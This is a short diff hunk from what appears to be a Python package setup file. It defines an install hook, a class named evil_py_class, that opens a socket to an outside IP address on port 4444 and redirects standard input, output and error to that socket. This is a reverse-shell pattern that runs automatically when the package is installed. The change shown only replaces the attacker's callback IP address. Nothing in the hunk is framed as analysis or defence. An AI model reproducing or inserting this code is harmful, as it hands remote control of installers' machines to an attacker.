@@ -6,7 +6,7 @@ import socket,os,pty
 class evil_py_class(install):
   def run(self):
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect(("52.90.0.232",4444))
+    s.connect(("45.55.220.81",4444))
     os.dup2(s.fileno(),0)
     os.dup2(s.fileno(),1)
     os.dup2(s.fileno(),2)
